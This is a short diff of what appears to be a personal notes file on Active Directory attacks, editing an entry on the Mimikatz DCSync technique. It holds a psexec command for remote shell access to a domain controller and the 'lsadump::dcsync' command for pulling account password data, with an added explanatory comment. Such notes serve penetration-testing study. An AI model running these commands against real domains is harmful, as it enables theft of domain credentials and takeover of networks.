@@ -406,7 +406,9 @@ psexec \\<domain controller> cmd.exe  // login to the user specified in the tick
 
 // But the recieving dc does not check if the request came from another dc. It only checks for SID associated has appropriate privileges or not.
 
-lsadump::dcsync /user:Administrator
+// DCSync impersonates the behavior of Domain Controller and requests account password data from the targeted Domain Controller.
+
+lsadump::dcsync /domain:<domain name> /user:<username>
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  
